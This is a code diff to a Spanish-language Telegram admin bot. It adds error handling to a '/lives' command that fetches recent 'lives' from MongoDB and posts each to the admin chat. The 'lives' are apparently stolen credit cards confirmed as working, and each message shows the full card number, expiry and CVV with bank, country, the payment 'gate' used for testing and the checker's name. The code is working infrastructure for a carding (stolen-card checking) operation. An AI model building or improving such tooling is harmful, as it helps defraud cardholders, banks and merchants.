@@ -776,47 +776,60 @@ const adminCommands = {
             let lives;
             const livesCollection = mongoose.connection.db.collection('lives');
 
-            // Si no hay argumentos, mostrar las últimas 10 lives generales
-            if (!args || args.length === 0) {
-                lives = await livesCollection.find()
-                    .sort({ fechaEncontrada: -1 })
-                    .limit(10)
-                    .toArray();
-            } 
-            // Si hay un username, buscar por ese usuario
-            else {
-                const username = args[0];
-                lives = await livesCollection.find({ 'checkedBy.username': username })
-                    .sort({ fechaEncontrada: -1 })
-                    .limit(10)
-                    .toArray();
-            }
+            try {
+                // Si no hay argumentos, mostrar las últimas 10 lives generales
+                if (!args || args.length === 0) {
+                    lives = await livesCollection.find()
+                        .sort({ fechaEncontrada: -1 })
+                        .limit(10)
+                        .toArray();
+                } 
+                // Si hay un username, buscar por ese usuario
+                else {
+                    const username = args[0];
+                    lives = await livesCollection.find({ 'checkedBy.username': username })
+                        .sort({ fechaEncontrada: -1 })
+                        .limit(10)
+                        .toArray();
+                }
 
-            if (!lives || lives.length === 0) {
-                await adminBot.sendMessage(msg.chat.id, '❌ No se encontraron lives');
-                return;
-            }
+                if (!lives || lives.length === 0) {
+                    await adminBot.sendMessage(msg.chat.id, '❌ No se encontraron lives', {
+                        chat_id: msg.chat.id
+                    });
+                    return;
+                }
 
-            // Enviar cada live en un mensaje separado
-            for (const live of lives) {
-                const mensaje = `💳 *LIVE ENCONTRADA*\n\n` +
-                    `CC: ${live.tarjeta.numero}|${live.tarjeta.fecha}|${live.tarjeta.cvv}\n` +
-                    `🏦 Banco: ${live.detalles.banco}\n` +
-                    `🌍 País: ${live.detalles.pais}\n` +
-                    `💠 Nivel: ${live.detalles.nivel}\n` +
-                    `🔄 Gate: ${live.detalles.gate}\n` +
-                    `💬 Respuesta: ${live.detalles.respuesta}\n` +
-                    `👤 Checker: ${live.checkedBy.username || 'Unknown'}\n` +
-                    `⏰ Fecha: ${new Date(live.fechaEncontrada).toLocaleString()}`;
+                // Enviar cada live en un mensaje separado
+                for (const live of lives) {
+                    const mensaje = `💳 *LIVE ENCONTRADA*\n\n` +
+                        `CC: ${live.tarjeta.numero}|${live.tarjeta.fecha}|${live.tarjeta.cvv}\n` +
+                        `🏦 Banco: ${live.detalles.banco}\n` +
+                        `🌍 País: ${live.detalles.pais}\n` +
+                        `💠 Nivel: ${live.detalles.nivel}\n` +
+                        `🔄 Gate: ${live.detalles.gate}\n` +
+                        `💬 Respuesta: ${live.detalles.respuesta}\n` +
+                        `👤 Checker: ${live.checkedBy.username || 'Unknown'}\n` +
+                        `⏰ Fecha: ${new Date(live.fechaEncontrada).toLocaleString()}`;
 
-                await adminBot.sendMessage(msg.chat.id, mensaje, {
-                    parse_mode: 'Markdown'
+                    await adminBot.sendMessage(msg.chat.id, mensaje, {
+                        parse_mode: 'Markdown',
+                        chat_id: msg.chat.id
+                    });
+                }
+
+            } catch (dbError) {
+                console.error('Error accediendo a la colección:', dbError);
+                await adminBot.sendMessage(msg.chat.id, '❌ Error accediendo a la base de datos', {
+                    chat_id: msg.chat.id
                 });
             }
 
         } catch (error) {
             console.error('Error en comando /lives:', error);
-            await adminBot.sendMessage(msg.chat.id, '❌ Error obteniendo lives');
+            await adminBot.sendMessage(msg.chat.id, '❌ Error obteniendo lives', {
+                chat_id: msg.chat.id
+            });
         }
     }
 };
